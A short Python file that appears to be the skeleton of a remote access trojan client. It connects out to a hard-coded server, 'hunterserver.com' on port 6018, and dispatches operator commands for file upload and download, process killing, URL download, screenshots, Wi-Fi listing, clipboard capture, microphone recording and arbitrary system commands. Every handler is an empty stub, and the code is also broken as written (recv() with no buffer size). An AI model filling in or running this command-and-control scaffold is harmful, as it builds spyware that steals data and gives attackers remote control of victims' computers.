import socket, subprocess, os, base64


def run(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((host, port))
        except:
            return
        while True:
            command = client_socket.recv()
            if command == "exit":
                pass
            elif command == "pwd":
                pass
            elif command[:2] == "cd":
                pass
            elif command == "sysinfo":
                pass
            elif command[:8] == "download":
                pass
            elif command[:6] == "upload":
                pass
            elif command == "netstat":
                pass
            elif command[:4] == "kill":
                pass
            elif command == "cpl":
                pass
            elif command[:6] == "urldwn":
                pass
            elif command[:3] == "run":
                pass
            elif command[:7] == "prt_scr":
                pass
            elif command == "wifi_lst":
                pass
            elif command == "clipboard":
                pass
            elif command[:21] == "mic_record --duration":
                pass
            else: # * Run Other System Commands
                pass
    except:
        return


if "__main__" == __name__:
    run(host="hunterserver.com", port=6018)
